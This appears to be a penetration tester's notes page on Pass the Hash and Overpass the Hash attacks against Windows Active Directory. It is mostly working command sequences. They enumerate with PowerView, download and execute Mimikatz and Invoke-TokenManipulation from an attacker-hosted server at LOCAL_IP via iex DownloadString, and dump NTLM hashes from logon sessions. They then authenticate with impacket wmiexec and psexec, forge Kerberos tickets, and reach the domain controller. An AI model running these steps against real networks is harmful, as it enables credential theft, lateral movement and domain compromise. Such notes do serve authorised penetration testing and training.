---
title: Pass the Hash (PtH)
draft: false
tags:
  - windows
  - active-directory
  - recon
  - info-gathering
  - active
---
 
Uses the NTLM hash of a local administrator legitimately to access a target host.

> [!Requirements] 
> 1. SMB connection through the firewall (**IMPORTANT: commonly port 445**).
> 2. Windows File and Printer Sharing feature to be enabled.
> 3. ADMIN$ Share available (requires local admin rights to interact with this share)
> 4. Provide credentials with local administrative permissions on the target machine.

> [!Important]
> - If user is not Administrator but belongs to the local admins group, UAC will block RCE with admin privileges.
> - If connection doesnt work, probably is because its being firewalled by port 445. 
> - If the target is only reachable through a pivot host, we could perform pivoting and proxying through the pivot host on port 445

Steps:
1. Load PowerView and perform a general enumeration:
```powershell
PS> powershell -ep bypass
PS> . .\PowerView.ps1 

+ GENERAL ENUMERATION +
PS> Get-Domain (get current domain + DC name)
PS> Find-LocalAdminAccess (find a machine in the current domain in which the current user has local admin access or one we can remote to)
```

2. Access the remote system (pivot host):
```powershell
PS> Enter-PSSession SYSTEM_FQDN
SYSTEM_FQDN: seclogs.research.SECURITY.local (full domain name)
```

3. Obtain hashes:
```powershell
*upload mimikatz to HFS*
PS [remote]> iex (New-Object Net.WebClient).DownloadString('http://LOCAL_IP/Invoke-TokenManipulation.ps1')
PS [remote]> Invoke-TokenManipulation -Enumerate (enumerate all available tokens. Check for logontype=2 which means that the user is currently loged in the system or has loged in)

PS [remote]> iex (New-Object Net.WebClient).DownloadString('http://LOCAL_IP/Invoke-Mimikatz.ps1') 
PS [remote]> Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"' (check if we have enough privileges + dump the NTLM hash of the loged in users)
```

4. Perform PtH attack (alternative):
```bash
$ /usr/bin/impacket-wmiexec -hashes :NTLM_HASH ADMIN_USER@TARGET_IP

$ impacket-psexec USER@TARGET_IP -hashes :NTLM_HASH
```

> [!Note]
> Requires administrative privileges on the target machine and be able to write the ADMIN share. Check the requirements at the beginning of this page. You can check the privileges by running the following command:
> `$ crackmapexec smb TARGET_IP -u USER -H NTLM_HASH`
> 
> Check for `(Pwn3d!)`

**ALTERNATIVE** (overpass the hash)
Perform **overpass the hash** attack: turn the NTLM hash into a Kerberos TGT and avoid the use of NTLM authentication. We then make use of the TGT to access domain resources by requesting TGS.

> [!Requirements]
> - High privileged access on the current machine (pivot host, not target). 
> - Execute PSH with high privileges to be able to run mimikatz

```powershell
1. Forge the TGT for the target user:
PS> powershell -ep bypass
PS> . .\Invoke-Mimikatz.ps1
PS> Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:DOMAIN_FQDN /ntlm:NTLM_HASH /run:powershell.exe"'

2. Access domain resources as the target user:
PS C:\> klist # we should see some tickets
PS C:\> net use \\TARGET_HOSTNAME # we should be able to access allowed hosts
PS C:\> ls \\TARGET_HOSTNAME\c$
PS C:\> klist # new tickets should be loaded for the target user

3. Obtain RCE after forging TGT:
PS C:\> .\PsExec.exe \\TARGET_HOSTNAME cmd # using microsoft official PsExec which doesnt accept NTLM hashes
```

> [!Note]
> This method leverages Kerberos TGT so if we use commands like `whoami` we will still appear as the previous user. 
> If we try to access a domain resource using the new user (for example `net use \\web04`) we should be able to access it and see new kerberos tickets using the command `klist` (a TGT and a TGS for each domain service we want to access).

5. Access the DC (in case the user we have created the PSH session for, is a domain admin)
```powershell
+ ACCESS THE DC +
PS> Enter-PSSession DC_NAME
```

> [!Note]
> In this case the hash we have compromised is from a domain admin user so we can remotely access the DC
